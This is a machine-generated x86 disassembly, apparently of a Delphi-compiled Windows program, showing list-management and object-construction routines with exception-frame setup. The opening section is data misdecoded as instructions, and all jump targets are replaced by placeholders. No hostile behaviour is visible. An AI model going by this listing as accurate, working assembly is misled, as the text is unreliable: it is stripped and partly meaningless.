mov ah 0x5f
inc ecx
add al cl
bound eax [ ecx ]
or edx [ esi + eax * 2 + 0x69 ]
insb
inc ecx
add al cl
bound eax [ ecx ]
or eax 0x6e614854
test al 0x62
inc ecx
add [ eax - 0x4bffbe9e ] bh
pop edi
popad
insd
jl r-xdata
jb r-xdata
jae r-xdata
insd
dec ebp
insd
outsd
jb r-xdata
popad
insd
cld
and [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ ecx ] ah
inc ecx
add [ eax ] dl
add [ eax ] al
add [ eax ] dh
pop ds
inc ecx
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
mov al 0x5e
inc ecx
add ah bh
pop esi
inc ecx
add [ edi + ebx * 2 ] dl
inc ecx
add [ 0x2aa80041 ] al
inc eax
add [ 0x60380041 ] bh
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
bound eax [ ecx ]
or [ ebx + 0x41 ] ah
add [ eax - 0x47ffbe9e ] ch
bound eax [ ecx ]
mov ah 0x5f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x20
inc ecx
add ah dh
adc [ eax ] al
add [ eax ] al
pop es
inc ebx
insb
popad
jae r-xdata
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
mov al 0x5e
inc ecx
add ah dh
insd
movsb [ edi ] [ esi ]
pop ds
inc ecx
add [ edi ] al
pop es
push esp
push ebx
je r-xdata
popad
add [ ebp + 0x1f7c0040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x400411f ] bl
add [ eax ] al
add [ eax - 0x17ffbff0 ] ah
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
jns r-xdata
push ebx
je r-xdata
cmp [ eax + 0x41 ] ah
je r-xdata
insb
push ebx
je r-xdata
outsb
jae r-xdata
mov al 0x5e
inc ecx
add ah bh
pop esi
inc ecx
add [ edi + ebx * 2 ] dl
inc ecx
add [ 0x68780041 ] al
inc ecx
add [ 0x60380041 ] bh
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
je r-xdata
outsd
jb r-xdata
insd
popad
insd
js r-xdata
push ebx
push ebx
add [ eax ] dh
inc cx
add [ 0x6d654d54 ] cl
inc ecx
add [ eax ] bh
pushad
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax ] dh
pop ds
inc ecx
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ ebp + 0x20100040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
outsd
popad
insd
mov eax eax
hlt
inc ecx
add [ eax + eax ] dl
add [ eax ] al
mov al 0x20
inc ecx
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
pushad
inc ecx
add [ eax + 0x400415e ] dh
inc cx
add [ edi + ebx * 2 ] dl
inc ecx
add [ 0x66bc0041 ] al
inc ecx
add [ 0x60380041 ] bh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x14004121 ] bl
add [ eax ] al
add [ eax - 0x17ffbee0 ] dh
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
sub_4121ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ edx ] ah
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax - 0x17ffbee0 ] dh
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
inc eax
push 0x5eb00041
inc ecx
add ah bh
pop esi
inc ecx
add [ edi + ebx * 2 ] dl
inc ecx
add [ 0x68780041 ] al
inc ecx
add [ 0x60380041 ] bh
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
arpl [ ebp + 0x53 ] sp
je r-xdata
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
sub_412988
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405ef4
pop edi
pop esi
pop ebx
retn
sub_4129b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405ed8
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4129d8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405efc
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412ad0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_413de4
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_4034cc
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_4034cc
test al al
je r-xdata
sub_412b30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_412ad0
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_412ad0
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4034cc
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_412ba0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403270
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_413c88
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_412c1c
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
mov eax [ esi + 0x4 ]
call sub_4032a0
mov eax [ esi + 0x8 ]
call sub_4032a0
mov eax [ esi + 0xc ]
call sub_4032a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_412c5c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_413de4
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_403204
test al al
jne r-xdata
sub_412cbc
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_413de4
mov edx eax
mov eax ebp
call sub_4034cc
test al al
jne r-xdata
sub_412d00
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412d9b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4031f0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4042d8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_412c5c
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_413c88
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412da2
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_403a2c
sub_412dc0
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_405098
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_412de0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_413de4
mov edx edi
call sub_412dc0
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_413de4
mov edx edi
call sub_412dc0
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_413cd4
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_412dc0
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_413cd4
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_412e84
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_413de4
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_412cbc
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_412ed0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403270
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_412ba0
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413c88
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_412f44
push ebx
push esi
push edi
push ebp
call sub_40362c
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403614
mov eax [ esi + 0x4 ]
mov edx edi
call sub_413de4
call sub_4032a0
inc edi
dec ebp
jne r-xdata
sub_412fa0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_413de4
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_412b30
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_412fe4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_412c5c
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_413de4
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_413028
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_4130ab
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4031f0
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4130b2
lea eax [ ebp - 0x10c ]
call sub_404074
retn
sub_4130b8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_412fa0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_412ac4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_413028
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_413de4
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413de4
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4034cc
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_412fa0
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413cd4
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_413c88
sub_4131a4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413de4
mov edx ebp
call sub_412da8
test al al
jne r-xdata
sub_4131e8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_412ba0
mov edx eax
mov eax [ edi + 0x4 ]
call sub_413c88
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413de4
mov eax [ eax + 0xc ]
mov edx ebp
call sub_413e40
test eax eax
jge r-xdata
sub_413244
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413de4
mov esi eax
mov edx ebp
mov eax esi
call sub_412de0
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_4032a0
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413cd4
sub_413294
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403270
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_413180
xor eax eax
push ebp
push sub_413393
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41339a
mov eax [ rw-data ]
call sub_413238
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413c88
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_413de4
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_412cbc
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413c88
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_413de4
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_41339a
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_4133c0
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_4133f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_413180
xor edx edx
push ebp
push sub_413467
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413238
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403ad8
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413de4
mov edx [ ebp - 0x4 ]
call sub_412c5c
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_413484
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4134e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4134eb
lea eax [ ebp - 0xc ]
call sub_404074
retn
sub_4134f0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_413180
xor eax eax
push ebp
push sub_413536
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412fe4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41353d
mov eax [ rw-data ]
call sub_413238
retn
sub_413544
push ebx
push esi
mov esi eax
mov eax esi
call sub_4134f0
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_413484
sub_413564
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_413180
xor eax eax
push ebp
push sub_4135c9
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4131a4
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_41318c
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4135d0
mov eax [ rw-data ]
call sub_413238
retn
mov eax ebx
call sub_40322c
mov ebx eax
sub_4135d4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_413180
xor eax eax
push ebp
push sub_413616
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_413244
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41361d
mov eax [ rw-data ]
call sub_413238
retn
sub_413620
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_413180
xor eax eax
push ebp
push sub_413662
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4131e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413669
mov eax [ rw-data ]
call sub_413238
retn
sub_41366c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_413180
xor eax eax
push ebp
push sub_4136b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_4130b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4136ba
mov eax [ rw-data ]
call sub_413238
retn
sub_4136c0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_413180
xor eax eax
push ebp
push sub_41370e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_412e84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413715
mov eax [ rw-data ]
call sub_413238
retn
sub_413774
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
pop ebp
retn 0x8
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_4137ac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_413774
mov edx eax
mov eax [ rw-data ]
call sub_41415c
pop edi
pop esi
pop ebx
retn
sub_4137d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_4141e4
mov esi eax
xor edx edx
push ebp
push sub_413842
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414248
retn
mov edx ebx
mov eax esi
call sub_413de4
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403ad8
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413854
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
